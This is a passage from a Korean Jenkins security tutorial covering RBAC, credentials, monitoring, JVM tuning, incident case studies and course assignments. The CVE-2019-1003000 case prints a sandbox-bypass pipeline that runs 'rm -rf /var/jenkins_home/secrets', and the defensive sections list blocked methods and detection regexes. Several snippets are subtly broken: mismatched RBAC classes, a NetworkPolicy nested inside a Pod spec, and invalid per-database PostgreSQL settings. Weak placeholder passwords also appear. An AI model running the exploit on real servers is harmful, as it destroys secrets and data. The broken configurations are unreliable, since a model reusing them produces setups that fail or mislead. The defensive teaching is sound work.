            cleanup_old_backups
            ;;
        restore)
            if [ -z "${2:-}" ]; then
                echo "사용법: $0 restore <backup_file>"
                exit 1
            fi
            restore_backup "$2"
            ;;
        verify)
            if [ -z "${2:-}" ]; then
                echo "사용법: $0 verify <backup_file>"
                exit 1
            fi
            verify_backup "$2"
            ;;
        *)
            echo "사용법: $0 {backup|restore|verify}"
            exit 1
            ;;
    esac
}

main "$@"
```

---

## 실습: 철통 보안 환경 구축

이제 이론을 바탕으로 실제 엔터프라이즈급 보안 환경을 구축해보겠습니다.

### 실습 1: 역할 기반 권한 제어 설정

#### Step 1: Role Strategy Plugin 설치

```bash
# Jenkins CLI를 통한 플러그인 설치
docker exec jenkins-master jenkins-plugin-cli \
    --plugins role-strategy:latest \
    --restart
```

#### Step 2: 보안 정책 구성

```groovy
// security-config.groovy
import hudson.security.*
import jenkins.model.*
import nectar.plugins.rbac.*

def jenkins = Jenkins.instance

// Role-based Authorization Strategy 활성화
def strategy = new RoleBasedAuthorizationStrategy()

// 글로벌 역할 정의
strategy.addRole(RoleType.Global, new Role("admin", 
    GlobalRole.ADMIN_PERMISSIONS))

strategy.addRole(RoleType.Global, new Role("read", 
    Permission.fromId("hudson.model.Hudson.Read")))

strategy.addRole(RoleType.Global, new Role("developer", 
    Permission.fromId("hudson.model.Hudson.Read"),
    Permission.fromId("hudson.model.Item.Build"),
    Permission.fromId("hudson.model.Item.Cancel"),
    Permission.fromId("hudson.model.Item.Read")))

// 프로젝트별 역할 정의
strategy.addRole(RoleType.Project, new Role("project-admin", 
    Permission.fromId("hudson.model.Item.Build"),
    Permission.fromId("hudson.model.Item.Configure"),
    Permission.fromId("hudson.model.Item.Create"),
    Permission.fromId("hudson.model.Item.Delete"),
    Permission.fromId("hudson.model.Item.Read"),
    Permission.fromId("hudson.model.Item.Workspace")), 
    [".*"] as Set)

// Jenkins에 적용
jenkins.setAuthorizationStrategy(strategy)
jenkins.save()

println "✅ 역할 기반 권한 제어가 구성되었습니다."
```

#### Step 3: 사용자 및 그룹 할당

```bash
# Jenkins CLI를 통한 사용자 생성
docker exec jenkins-master jenkins-cli -s http://localhost:8080/ \
    -auth admin:admin \
    create-user developer1 \
    --password dev123 \
    --full-name "Developer One" \
    --email dev1@company.com

# 역할 할당 (Groovy 스크립트로)
docker exec jenkins-master jenkins-cli -s http://localhost:8080/ \
    -auth admin:admin \
    groovy = << 'EOF'
import nectar.plugins.rbac.*
def strategy = Jenkins.instance.authorizationStrategy
strategy.assignRole(RoleType.Global, new Role("developer"), "developer1")
strategy.assignRole(RoleType.Project, new Role("project-admin"), "developer1", ["frontend-.*"])
Jenkins.instance.save()
EOF
```

### 실습 2: Credentials 보안 강화

#### Step 1: Credentials Domains 구성

```groovy
// credentials-domains.groovy
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.domains.*
import jenkins.model.Jenkins

def store = Jenkins.instance.getExtensionList('com.cloudbees.plugins.credentials.SystemCredentialsProvider')[0].getStore()

// 도메인별 자격증명 분리
def domains = [
    new Domain("production", "Production Environment Credentials", [
        new SchemeRequirement("https"),
        new HostnameRequirement("*.prod.company.com")
    ]),
    new Domain("staging", "Staging Environment Credentials", [
        new SchemeRequirement("https"), 
        new HostnameRequirement("*.stage.company.com")
    ]),
    new Domain("development", "Development Environment Credentials", [
        new SchemeRequirement("http"),
        new HostnameRequirement("*.dev.company.com")
    ])
]

domains.each { domain ->
    store.addDomain(domain)
}

Jenkins.instance.save()
println "✅ Credentials 도메인이 구성되었습니다."
```

#### Step 2: 안전한 Secret 저장

```groovy
// secure-credentials.groovy
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.impl.*
import com.cloudbees.jenkins.plugins.sshcredentials.impl.*
import hudson.util.Secret
import jenkins.model.Jenkins

def store = Jenkins.instance.getExtensionList('com.cloudbees.plugins.credentials.SystemCredentialsProvider')[0].getStore()

// SSH Private Key 등록
def privateKey = """-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA...
-----END RSA PRIVATE KEY-----"""

def sshCredential = new BasicSSHUserPrivateKey(
    CredentialsScope.GLOBAL,
    "deployment-key",
    "jenkins",
    new BasicSSHUserPrivateKey.DirectEntryPrivateKeySource(privateKey),
    "passphrase",
    "SSH key for deployment"
)

// Database Connection String
def dbCredential = new StringCredentialsImpl(
    CredentialsScope.GLOBAL,
    "db-connection-string", 
    "Database connection string",
    Secret.fromString("postgresql://user:password@db.company.com:5432/app")
)

// API Token
def apiCredential = new SecretTextImpl(
    CredentialsScope.GLOBAL,
    "github-api-token",
    "GitHub API Token",
    Secret.fromString("ghp_abcdef123456...")
)

// Username/Password
def userCredential = new UsernamePasswordCredentialsImpl(
    CredentialsScope.GLOBAL,
    "docker-registry",
    "Docker Registry Credentials",
    "jenkins",
    "password123"
)

// 저장
store.addCredentials(Domain.global(), sshCredential)
store.addCredentials(Domain.global(), dbCredential)  
store.addCredentials(Domain.global(), apiCredential)
store.addCredentials(Domain.global(), userCredential)

Jenkins.instance.save()
println "✅ 보안 자격증명이 등록되었습니다."
```

#### Step 3: Pipeline에서 안전한 사용

```groovy
// Jenkinsfile 예시
pipeline {
    agent { label 'docker' }
    
    environment {
        // 환경 변수로 안전하게 주입
        DB_URL = credentials('db-connection-string')
        GITHUB_TOKEN = credentials('github-api-token')
    }
    
    stages {
        stage('Checkout') {
            steps {
                git credentialsId: 'deployment-key',
                    url: 'git@github.com:company/app.git'
            }
        }
        
        stage('Build') {
            steps {
                script {
                    // Docker Registry 로그인
                    withCredentials([usernamePassword(
                        credentialsId: 'docker-registry',
                        usernameVariable: 'DOCKER_USER',
                        passwordVariable: 'DOCKER_PASS'
                    )]) {
                        sh """
                            echo "\$DOCKER_PASS" | docker login -u "\$DOCKER_USER" --password-stdin registry.company.com
                            docker build -t registry.company.com/app:${env.BUILD_NUMBER} .
                            docker push registry.company.com/app:${env.BUILD_NUMBER}
                        """
                    }
                }
            }
        }
        
        stage('Database Migration') {
            steps {
                script {
                    // 데이터베이스 연결 정보는 환경 변수로 사용
                    sh """
                        export DATABASE_URL="\$DB_URL"
                        npm run migrate
                    """
                }
            }
        }
        
        stage('Notify') {
            steps {
                script {
                    // GitHub API 호출
                    sh """
                        curl -H "Authorization: token \$GITHUB_TOKEN" \\
                             -X POST \\
                             -d '{"state":"success","target_url":"${env.BUILD_URL}","description":"Build completed"}' \\
                             https://api.github.com/repos/company/app/statuses/${env.GIT_COMMIT}
                    """
                }
            }
        }
    }
    
    post {
        always {
            // 로그에서 민감한 정보 제거
            script {
                sh '''
                    # 빌드 로그에서 패스워드 패턴 제거
                    sed -i 's/password[=:][^[:space:]]*/password=***REDACTED***/g' "${JENKINS_HOME}/jobs/${JOB_NAME}/builds/${BUILD_NUMBER}/log"
                '''
            }
        }
    }
}
```

### 실습 3: 보안 모니터링 설정

#### Step 1: 로그 집중화

```yaml
# fluentd-jenkins.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: fluentd-jenkins-config
data:
  fluent.conf: |
    <source>
      @type tail
      path /var/log/jenkins/jenkins.log
      pos_file /var/log/fluentd/jenkins.log.pos
      tag jenkins.application
      format multiline
      format_firstline /^\d{4}-\d{2}-\d{2}/
      format1 /^(?<time>\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}\.\d{3}) \[(?<level>[^\]]*)\] (?<logger>[^:]*): (?<message>.*)/
    </source>
    
    <source>
      @type tail
      path /var/log/jenkins/security-audit.log
      pos_file /var/log/fluentd/security.log.pos
      tag jenkins.security
      format json
    </source>
    
    # 보안 이벤트 필터링
    <filter jenkins.security>
      @type grep
      <regexp>
        key level
        pattern (WARN|ERROR|SECURITY)
      </regexp>
    </filter>
    
    # 민감한 정보 마스킹
    <filter jenkins.**>
      @type record_transformer
      <record>
        message ${record["message"].gsub(/password[=:][^\s]+/, "password=***REDACTED***")}
      </record>
    </filter>
    
    <match jenkins.**>
      @type elasticsearch
      host elasticsearch.logging.svc.cluster.local
      port 9200
      index_name jenkins-logs
      include_tag_key true
      tag_key @log_name
      flush_interval 5s
    </match>
```

#### Step 2: 실시간 보안 알림

```python
#!/usr/bin/env python3
# jenkins-security-monitor.py

import json
import re
import time
import requests
from datetime import datetime, timedelta
from collections import defaultdict, deque

class JenkinsSecurityMonitor:
    def __init__(self):
        self.failed_logins = defaultdict(lambda: deque(maxlen=100))
        self.suspicious_activities = []
        self.slack_webhook = "https://hooks.slack.com/services/YOUR/SLACK/WEBHOOK"
        
    def parse_log_line(self, line):
        """Jenkins 로그 라인 파싱"""
        patterns = {
            'failed_login': r'Failed to authenticate user (\w+) from (\d+\.\d+\.\d+\.\d+)',
            'admin_action': r'User (\w+) performed admin action: (.+)',
            'credential_access': r'User (\w+) accessed credentials: (.+)',
            'job_creation': r'User (\w+) created job: (.+)',
            'permission_change': r'User (\w+) modified permissions for: (.+)'
        }
        
        for event_type, pattern in patterns.items():
            match = re.search(pattern, line)
            if match:
                return {
                    'type': event_type,
                    'timestamp': datetime.now(),
                    'data': match.groups(),
                    'raw': line
                }
        return None
    
    def analyze_failed_logins(self, event):
        """브루트포스 공격 탐지"""
        username, ip = event['data']
        current_time = event['timestamp']
        
        # 최근 5분간의 실패 기록 추가
        self.failed_logins[f"{username}@{ip}"].append(current_time)
        
        # 5분 이내 실패 횟수 계산
        five_minutes_ago = current_time - timedelta(minutes=5)
        recent_failures = [
            t for t in self.failed_logins[f"{username}@{ip}"] 
            if t > five_minutes_ago
        ]
        
        if len(recent_failures) >= 5:
            self.send_alert("brute_force", {
                'user': username,
                'ip': ip,
                'attempts': len(recent_failures),
                'timeframe': '5 minutes'
            })
            return True
        return False
    
    def analyze_admin_actions(self, event):
        """관리자 작업 모니터링"""
        username, action = event['data']
        
        # 위험한 관리자 작업 목록
        dangerous_actions = [
            'user deletion',
            'permission modification',
            'security realm change',
            'script execution',
            'plugin installation'
        ]
        
        if any(dangerous in action.lower() for dangerous in dangerous_actions):
            self.send_alert("dangerous_admin_action", {
                'user': username,
                'action': action,
                'timestamp': event['timestamp'].isoformat()
            })
            return True
        return False
    
    def send_alert(self, alert_type, data):
        """Slack으로 보안 알림 전송"""
        alert_messages = {
            'brute_force': f"🚨 **브루트포스 공격 탐지**\n사용자: {data['user']}\nIP: {data['ip']}\n시도 횟수: {data['attempts']}회",
            'dangerous_admin_action': f"⚠️  **위험한 관리자 작업**\n사용자: {data['user']}\n작업: {data['action']}"
        }
        
        payload = {
            "text": alert_messages.get(alert_type, f"알 수 없는 보안 이벤트: {alert_type}"),
            "channel": "#security-alerts",
            "username": "Jenkins Security Bot"
        }
        
        try:
            response = requests.post(self.slack_webhook, json=payload)
            response.raise_for_status()
        except Exception as e:
            print(f"알림 전송 실패: {e}")
    
    def monitor_logs(self, log_file_path):
        """실시간 로그 모니터링"""
        with open(log_file_path, 'r') as f:
            # 파일 끝으로 이동
            f.seek(0, 2)
            
            while True:
                line = f.readline()
                if line:
                    event = self.parse_log_line(line.strip())
                    if event:
                        if event['type'] == 'failed_login':
                            self.analyze_failed_logins(event)
                        elif event['type'] == 'admin_action':
                            self.analyze_admin_actions(event)
                        # 기타 이벤트 처리...
                else:
                    time.sleep(1)

if __name__ == "__main__":
    monitor = JenkinsSecurityMonitor()
    monitor.monitor_logs("/var/log/jenkins/jenkins.log")
```

---

## 성능 최적화와 모니터링

### JVM 튜닝

Jenkins는 Java 애플리케이션이므로 JVM 설정이 성능에 큰 영향을 미칩니다.

#### 메모리 최적화

```bash
# jenkins-jvm-optimization.sh
#!/bin/bash

# 시스템 리소스 기반 자동 계산
TOTAL_RAM=$(free -g | awk '/^Mem:/{print $2}')
JENKINS_HEAP=$((TOTAL_RAM / 2))  # 전체 메모리의 50%

# JVM 옵션 설정
JAVA_OPTS=""

# 힙 메모리 설정
JAVA_OPTS="$JAVA_OPTS -Xms${JENKINS_HEAP}g"
JAVA_OPTS="$JAVA_OPTS -Xmx${JENKINS_HEAP}g"

# GC 최적화 (G1GC 사용)
JAVA_OPTS="$JAVA_OPTS -XX:+UseG1GC"
JAVA_OPTS="$JAVA_OPTS -XX:MaxGCPauseMillis=200"
JAVA_OPTS="$JAVA_OPTS -XX:G1HeapRegionSize=16m"
JAVA_OPTS="$JAVA_OPTS -XX:+UseStringDeduplication"

# 메모리 영역 최적화
JAVA_OPTS="$JAVA_OPTS -XX:MetaspaceSize=512m"
JAVA_OPTS="$JAVA_OPTS -XX:MaxMetaspaceSize=1g"

# 성능 모니터링
JAVA_OPTS="$JAVA_OPTS -XX:+PrintGCDetails"
JAVA_OPTS="$JAVA_OPTS -XX:+PrintGCTimeStamps"
JAVA_OPTS="$JAVA_OPTS -Xloggc:/var/log/jenkins/gc.log"

# 크래시 덤프 설정
JAVA_OPTS="$JAVA_OPTS -XX:+HeapDumpOnOutOfMemoryError"
JAVA_OPTS="$JAVA_OPTS -XX:HeapDumpPath=/var/log/jenkins/"

# 보안 설정
JAVA_OPTS="$JAVA_OPTS -Djava.awt.headless=true"
JAVA_OPTS="$JAVA_OPTS -Dfile.encoding=UTF-8"

echo "최적화된 JVM 옵션: $JAVA_OPTS"
export JAVA_OPTS
```

#### 성능 모니터링 대시보드

```yaml
# jenkins-monitoring.yaml
apiVersion: v1
kind: ServiceMonitor
metadata:
  name: jenkins-metrics
spec:
  selector:
    matchLabels:
      app: jenkins
  endpoints:
  - port: web
    path: /prometheus
    interval: 30s

---
apiVersion: v1
kind: ConfigMap
metadata:
  name: jenkins-dashboards
data:
  jenkins-overview.json: |
    {
      "dashboard": {
        "title": "Jenkins Performance Overview",
        "panels": [
          {
            "title": "Build Queue Length",
            "type": "graph",
            "targets": [
              {
                "expr": "jenkins_queue_size_value",
                "legendFormat": "Queue Size"
              }
            ]
          },
          {
            "title": "Build Duration",
            "type": "graph", 
            "targets": [
              {
                "expr": "rate(jenkins_builds_duration_milliseconds_summary_sum[5m]) / rate(jenkins_builds_duration_milliseconds_summary_count[5m])",
                "legendFormat": "Average Build Time"
              }
            ]
          },
          {
            "title": "Active Agents",
            "type": "singlestat",
            "targets": [
              {
                "expr": "jenkins_agents_total{status=\"online\"}",
                "legendFormat": "Online Agents"
              }
            ]
          },
          {
            "title": "JVM Memory Usage",
            "type": "graph",
            "targets": [
              {
                "expr": "jenkins_jvm_memory_usage_after_gc_heap",
                "legendFormat": "Heap Memory"
              },
              {
                "expr": "jenkins_jvm_memory_usage_after_gc_nonheap", 
                "legendFormat": "Non-Heap Memory"
              }
            ]
          }
        ]
      }
    }
```

### Database 연결 최적화

대규모 Jenkins 설치에서는 H2 대신 PostgreSQL을 사용하는 것이 권장됩니다.

```sql
-- jenkins-postgresql-setup.sql

-- Jenkins 전용 데이터베이스 생성
CREATE DATABASE jenkins_db
    WITH 
    OWNER = jenkins_user
    ENCODING = 'UTF8'
    LC_COLLATE = 'en_US.utf8'
    LC_CTYPE = 'en_US.utf8'
    TEMPLATE = template0
    CONNECTION LIMIT = 100;

-- 성능 최적화 설정
ALTER DATABASE jenkins_db SET shared_buffers = '256MB';
ALTER DATABASE jenkins_db SET effective_cache_size = '1GB';
ALTER DATABASE jenkins_db SET random_page_cost = 1.1;
ALTER DATABASE jenkins_db SET checkpoint_completion_target = 0.9;
ALTER DATABASE jenkins_db SET wal_buffers = '16MB';
ALTER DATABASE jenkins_db SET default_statistics_target = 100;

-- Jenkins 테이블 최적화
-- (Jenkins가 자동 생성한 후 실행)
CREATE INDEX CONCURRENTLY idx_builds_timestamp ON builds(timestamp);
CREATE INDEX CONCURRENTLY idx_queue_items_task ON queue_items(task);
CREATE INDEX CONCURRENTLY idx_fingerprints_hash ON fingerprints(hash_code);
```

---

## 실제 보안 사고 사례와 대응

### 사례 1: Jenkins RCE 취약점 (CVE-2019-1003000)

#### 사고 개요
2019년 1월, Jenkins Pipeline 플러그인에서 발견된 원격 코드 실행 취약점

**영향받는 버전:**
- Jenkins 2.159 이하
- Jenkins LTS 2.150.1 이하

**공격 벡터:**
```groovy
// 악의적 Pipeline 스크립트
@Library('victim-library@master') _

pipeline {
    agent any
    stages {
        stage('Exploit') {
            steps {
                script {
                    // Pipeline 샌드박스 우회
                    def method = "".class.forName('java.lang.Runtime')
                        .getDeclaredMethod('getRuntime')
                    method.setAccessible(true)
                    def runtime = method.invoke(null)
                    
                    def execMethod = runtime.class.getDeclaredMethod('exec', String.class)
                    execMethod.invoke(runtime, 'rm -rf /var/jenkins_home/secrets')
                }
            }
        }
    }
}
```

#### 대응 방안

**1. 즉시 대응**
```bash
# 긴급 패치 적용
docker exec jenkins-master jenkins-plugin-cli \
    --plugins workflow-cps:2.63 \
    --restart

# 의심스러운 파이프라인 비활성화
docker exec jenkins-master jenkins-cli -s http://localhost:8080/ \
    -auth admin:admin \
    disable-job suspicious-pipeline-*
```

**2. 샌드박스 강화**
```groovy
// script-security-config.groovy
import org.jenkinsci.plugins.scriptsecurity.scripts.*
import org.jenkinsci.plugins.scriptsecurity.sandbox.*

def scriptApproval = ScriptApproval.get()

// 위험한 메서드 차단
def blockedMethods = [
    'java.lang.Runtime.getRuntime',
    'java.lang.Class.forName',
    'java.lang.reflect.Method.setAccessible',
    'groovy.util.Eval.me'
]

blockedMethods.each { method ->
    scriptApproval.denySignature(method)
}

// Pipeline 스크립트 사전 승인 시스템 활성화
scriptApproval.configuredPipelineLibrariesEnabled = true
```

**3. 모니터링 강화**
```python
# exploit-detection.py
import re
import logging

class ExploitDetector:
    def __init__(self):
        self.dangerous_patterns = [
            r'Runtime\.getRuntime\(\)',
            r'Class\.forName\(',
            r'setAccessible\(true\)',
            r'invoke\(',
            r'eval\(',
            r'execute\(',
        ]
    
    def analyze_pipeline_script(self, script_content):
        """Pipeline 스크립트에서 악의적 패턴 탐지"""
        threats = []
        
        for i, line in enumerate(script_content.split('\n'), 1):
            for pattern in self.dangerous_patterns:
                if re.search(pattern, line, re.IGNORECASE):
                    threats.append({
                        'line': i,
                        'pattern': pattern,
                        'content': line.strip(),
                        'severity': 'HIGH'
                    })
        
        return threats
```

### 사례 2: Kubernetes Agent 권한 상승 공격

#### 사고 시나리오
공격자가 Kubernetes 클러스터 내 Jenkins Agent Pod를 통해 클러스터 전체 권한을 획득

**공격 과정:**
```yaml
# 취약한 Agent Pod 설정
apiVersion: v1
kind: Pod
spec:
  serviceAccountName: jenkins-agent  # 너무 많은 권한
  containers:
  - name: jenkins-agent
    image: jenkins/inbound-agent
    securityContext:
      privileged: true  # ← 위험: 호스트 접근 가능
    volumeMounts:
    - name: docker-sock
      mountPath: /var/run/docker.sock  # ← 위험: Docker 데몬 접근
  volumes:
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
```

#### 강화된 보안 구성

```yaml
# secure-jenkins-agent.yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: jenkins-agent-restricted
  namespace: jenkins
  
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: jenkins
  name: jenkins-agent-role
rules:
# 최소 권한만 부여
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list"]
- apiGroups: [""]
  resources: ["configmaps"]
  verbs: ["get", "list"]
  
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: jenkins-agent-binding
  namespace: jenkins
subjects:
- kind: ServiceAccount
  name: jenkins-agent-restricted
  namespace: jenkins
roleRef:
  kind: Role
  name: jenkins-agent-role
  apiGroup: rbac.authorization.k8s.io

---
apiVersion: v1
kind: Pod
metadata:
  name: secure-jenkins-agent
  namespace: jenkins
spec:
  serviceAccountName: jenkins-agent-restricted
  
  # Pod Security Standards 적용
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    fsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
      
  containers:
  - name: jenkins-agent
    image: jenkins/inbound-agent:latest
    
    # 컨테이너 보안 컨텍스트
    securityContext:
      allowPrivilegeEscalation: false
      privileged: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
        - ALL
        add:
        - NET_BIND_SERVICE  # 필요한 경우에만
        
    # 리소스 제한
    resources:
      requests:
        memory: "256Mi"
        cpu: "250m"
      limits:
        memory: "1Gi"
        cpu: "1000m"
        
    # 임시 볼륨만 사용
    volumeMounts:
    - name: workspace
      mountPath: /home/jenkins/agent
    - name: tmp
      mountPath: /tmp
      
  volumes:
  - name: workspace
    emptyDir: {}
  - name: tmp
    emptyDir: {}
    
  # Network Policy로 네트워크 접근 제한
  ---
  apiVersion: networking.k8s.io/v1
  kind: NetworkPolicy
  metadata:
    name: jenkins-agent-netpol
    namespace: jenkins
  spec:
    podSelector:
      matchLabels:
        app: jenkins-agent
    policyTypes:
    - Ingress
    - Egress
    egress:
    # Jenkins Controller만 접근 허용
    - to:
      - podSelector:
          matchLabels:
            app: jenkins-controller
      ports:
      - protocol: TCP
        port: 50000
    # DNS 조회 허용  
    - to:
      - namespaceSelector:
          matchLabels:
            name: kube-system
      ports:
      - protocol: UDP
        port: 53
```

---

## 문제 해결과 트러블슈팅

### 일반적인 문제와 해결책

#### 1. 메모리 부족 문제

**증상:**
```
OutOfMemoryError: Java heap space
jenkins.war failed to load
```

**진단:**
```bash
# 메모리 사용량 확인
docker exec jenkins-master jstat -gc $(docker exec jenkins-master pgrep java)

# GC 로그 분석
docker exec jenkins-master tail -f /var/log/jenkins/gc.log
```

**해결책:**
```bash
# 힙 메모리 증가
docker stop jenkins-master
docker rm jenkins-master

docker run -d \
  --name jenkins-master \
  --restart unless-stopped \
  -p 8080:8080 \
  -p 50000:50000 \
  -v jenkins_home:/var/jenkins_home \
  -e "JAVA_OPTS=-Xmx4g -Xms2g" \
  jenkins/jenkins:lts-jdk17
```

#### 2. Agent 연결 실패

**증상:**
```
java.io.IOException: Failed to launch slave agent (channel is shutting down)
Connection terminated: java.net.SocketException: Connection reset
```

**진단 스크립트:**
```bash
#!/bin/bash
# agent-connection-debug.sh

CONTROLLER_IP="jenkins.company.com"
CONTROLLER_PORT="50000"

echo "=== Agent 연결 진단 시작 ==="

# 1. 네트워크 연결 테스트
echo "1. Controller 연결 테스트..."
if nc -zv $CONTROLLER_IP $CONTROLLER_PORT; then
    echo "✅ Controller 포트 연결 가능"
else
    echo "❌ Controller 포트 연결 실패"
    echo "방화벽 설정을 확인하세요."
fi

# 2. DNS 해석 테스트
echo "2. DNS 해석 테스트..."
if nslookup $CONTROLLER_IP; then
    echo "✅ DNS 해석 정상"
else
    echo "❌ DNS 해석 실패"
    echo "/etc/hosts 파일이나 DNS 서버를 확인하세요."
fi

# 3. SSL 인증서 확인
echo "3. SSL 인증서 확인..."
echo | openssl s_client -connect $CONTROLLER_IP:443 2>/dev/null | \
    openssl x509 -noout -dates

# 4. JNLP 다운로드 테스트
echo "4. JNLP 파일 다운로드 테스트..."
curl -f "http://$CONTROLLER_IP:8080/computer/agent-01/slave-agent.jnlp" \
    > /dev/null 2>&1 && echo "✅ JNLP 다운로드 성공" || echo "❌ JNLP 다운로드 실패"

# 5. Agent 프로세스 확인
echo "5. Agent 프로세스 확인..."
if pgrep -f "jenkins.*agent" > /dev/null; then
    echo "✅ Agent 프로세스 실행 중"
    pgrep -af "jenkins.*agent"
else
    echo "⚠️ Agent 프로세스가 실행되지 않음"
fi
```

#### 3. Plugin 충돌 문제

**증상:**
```
java.lang.ClassCastException
NoSuchMethodError
Plugin dependency cycles detected
```

**해결 도구:**
```groovy
// plugin-conflict-analyzer.groovy
import jenkins.model.Jenkins
import hudson.PluginWrapper

def analyzePluginConflicts() {
    def jenkins = Jenkins.instance
    def conflicts = []
    
    jenkins.pluginManager.plugins.each { plugin ->
        try {
            // 플러그인 로딩 테스트
            plugin.classLoader.loadClass(plugin.wrapper.manifest.mainAttributes.getValue('Main-Class'))
        } catch (Exception e) {
            conflicts.add([
                plugin: plugin.shortName,
                version: plugin.version,
                error: e.message
            ])
        }
    }
    
    return conflicts
}

// 충돌 해결 제안
def suggestResolution(conflicts) {
    conflicts.each { conflict ->
        println "❌ ${conflict.plugin} v${conflict.version}: ${conflict.error}"
        
        // 알려진 해결책 제안
        def solutions = [
            'workflow-cps': '최신 pipeline 플러그인으로 업데이트',
            'git': 'git-client 플러그인 의존성 확인',
            'docker-workflow': 'Docker 플러그인과 버전 호환성 확인'
        ]
        
        if (solutions[conflict.plugin]) {
            println "💡 해결책: ${solutions[conflict.plugin]}"
        }
        println ""
    }
}

def conflicts = analyzePluginConflicts()
suggestResolution(conflicts)
```

### 성능 진단 도구

```bash
#!/bin/bash
# jenkins-performance-analyzer.sh

echo "=== Jenkins 성능 분석 시작 ==="

# 1. 시스템 리소스 사용량
echo "1. 시스템 리소스 현황"
echo "CPU 사용률:"
top -bn1 | grep "Cpu(s)" | awk '{print $2 + $4}'

echo "메모리 사용률:"
free | grep Mem | awk '{printf "%.2f%%\n", $3/$2 * 100.0}'

echo "디스크 사용률:"
df -h | grep -vE '^Filesystem|tmpfs|cdrom'

# 2. Jenkins JVM 메모리 분석
echo "2. JVM 메모리 분석"
docker exec jenkins-master jcmd $(docker exec jenkins-master pgrep java) VM.classloader_stats
docker exec jenkins-master jcmd $(docker exec jenkins-master pgrep java) GC.run_finalization

# 3. 빌드 대기열 분석
echo "3. 빌드 대기열 현황"
curl -s "http://localhost:8080/queue/api/json" | \
    jq -r '.items[] | "\(.task.name): \(.why // "unknown")"'

# 4. Agent 성능 분석
echo "4. Agent 성능 현황"
curl -s "http://localhost:8080/computer/api/json" | \
    jq -r '.computer[] | select(.offline==false) | "\(.displayName): \(.numExecutors - .idle) busy / \(.numExecutors) total"'

# 5. 플러그인 로딩 시간 분석
echo "5. 느린 플러그인 식별"
docker exec jenkins-master grep "Loading plugin" /var/log/jenkins/jenkins.log | \
    grep -oP "Loading plugin \K[^:]+" | sort | uniq -c | sort -nr | head -10
```

---

## 2주차 심화 과제

### 기본 과제 (필수)

#### 과제 1: 엔터프라이즈 보안 환경 구축
```bash
# 목표: 실제 기업 환경과 동일한 보안 설정 구현

# 요구사항:
# 1. LDAP 인증 시뮬레이션 (OpenLDAP 컨테이너 사용)
# 2. 3단계 권한 체계 (Admin, Developer, Viewer)
# 3. 프로젝트별 권한 분리 (frontend-*, backend-*)
# 4. Credentials 도메인 분리 (dev, staging, production)
# 5. 보안 감사 로그 활성화

# 제출물:
# - Docker Compose 파일
# - LDAP 스키마 파일
# - Jenkins Configuration as Code (JCasC) YAML
# - 권한 테스트 결과 스크린샷
```

#### 과제 2: 고가용성 클러스터 설계
```yaml
# 목표: Jenkins HA 클러스터 설계 및 구현

# 아키텍처:
# - 2개 Controller (Active-Passive)
# - 3개 Agent (Docker, Kubernetes, VM)
# - PostgreSQL Database
# - Redis Session Store
# - Nginx Load Balancer

# 요구사항:
# - 장애 조치 시간 30초 이내
# - 데이터 무손실 보장
# - 자동 백업 시스템
# - 모니터링 대시보드

# 제출물:
# - Kubernetes Manifests
# - Terraform 코드 (선택)
# - 장애 조치 테스트 리포트
# - 성능 벤치마크 결과
```

### 중급 과제 (선택)

#### 과제 3: CI/CD 보안 파이프라인 구축
```groovy
// 목표: 보안이 통합된 완전한 CI/CD 파이프라인

pipeline {
    agent { label 'secure-agent' }
    
    environment {
        SCANNER_VERSION = '4.7.0'
        SECURITY_THRESHOLD = 'HIGH'
    }
    
    stages {
        stage('Security Scan') {
            parallel {
                stage('Secret Detection') {
                    steps {
                        // TruffleHog, GitLeaks 등 구현
                    }
                }
                
                stage('SAST') {
                    steps {
                        // SonarQube, Semgrep 등 구현
                    }
                }
                
                stage('Dependency Check') {
                    steps {
                        // OWASP Dependency Check 구현
                    }
                }
                
                stage('Container Scan') {
                    steps {
                        // Trivy, Clair 등 구현
                    }
                }
            }
        }
        
        stage('Security Gate') {
            steps {
                script {
                    // 보안 임계값 기반 자동 판정 로직
                    // 실패 시 자동 롤백 또는 승인 요청
                }
            }
        }
    }
    
    post {
        always {
            // 보안 리포트 생성 및 전송
        }
    }
}
```

#### 과제 4: 성능 최적화 프로젝트
```bash
#!/bin/bash
# 목표: Jenkins 성능을 2배 향상시키기

# 측정 기준:
# - 빌드 시작 시간 (Queue → Running)
# - 평균 빌드 실행 시간
# - 동시 빌드 처리 능력
# - Web UI 응답 시간
# - 메모리 사용 효율성

# 최적화 영역:
# 1. JVM 튜닝
# 2. 플러그인 최적화
# 3. Agent 분산 전략
# 4. Database 쿼리 최적화
# 5. 캐시 전략

# 제출물:
# - 최적화 전후 성능 비교 리포트
# - 최적화 설정 파일들
# - 부하 테스트 스크립트
# - 모니터링 대시보드
```

### 고급 과제 (도전)

#### 과제 5: 멀티 클라우드 Jenkins 아키텍처
```yaml
# 목표: AWS, GCP, Azure에 걸친 글로벌 Jenkins 환경

# 아키텍처:
# - 3개 지역 (미국, 유럽, 아시아)
# - 각 지역별 Controller + Agent Pool
# - 글로벌 로드 밸런싱
# - 교차 백업 시스템
# - 통합 모니터링

# 기술 스택:
# - Terraform (인프라)
# - Kubernetes (컨테이너 오케스트레이션)
# - Istio (서비스 메시)
# - Prometheus + Grafana (모니터링)
# - ArgoCD (GitOps)

# 도전 과제:
# - 네트워크 지연 최소화
# - 데이터 주권 준수
# - 글로벌 보안 정책 통합
# - 비용 최적화
```

### 제출 기준

**품질 기준:**
- ✅ 코드 문서화: 모든 스크립트와 설정에 주석
- ✅ 재현 가능성: 다른 환경에서도 동일하게 동작
- ✅ 보안 검증: 알려진 취약점 없음
- ✅ 성능 측정: 정량적 지표로 개선 효과 증명
- ✅ 장애 시나리오: 예상 실패 상황과 대응 방법

**평가 방법:**
- 기본 과제: 70점 (기능 구현 여부)
- 중급 과제: 20점 (최적화 수준)
- 고급 과제: 10점 (창의성과 도전 정신)

---

